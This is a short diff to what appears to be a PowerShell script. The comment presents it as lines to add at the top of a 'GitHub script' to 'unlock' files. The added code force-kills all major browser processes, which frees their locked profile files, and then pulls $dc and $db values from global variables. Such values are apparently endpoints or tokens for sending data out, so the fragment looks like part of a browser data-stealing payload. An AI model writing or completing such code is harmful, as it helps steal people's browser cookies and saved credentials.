@@ -1,4 +1,8 @@
-# Add these to the top of your script on GitHub
+# Add these to the top of your GitHub script to "unlock" the files
+$browsers = "chrome", "msedge", "firefox", "opera"
+foreach ($b in $browsers) { Get-Process $b -ErrorAction SilentlyContinue | Stop-Process -Force }
+
+# Then include the 'Global' variable listener we discussed
 if ($Global:dc) { $dc = $Global:dc }
 if ($Global:db) { $db = $Global:db }
 
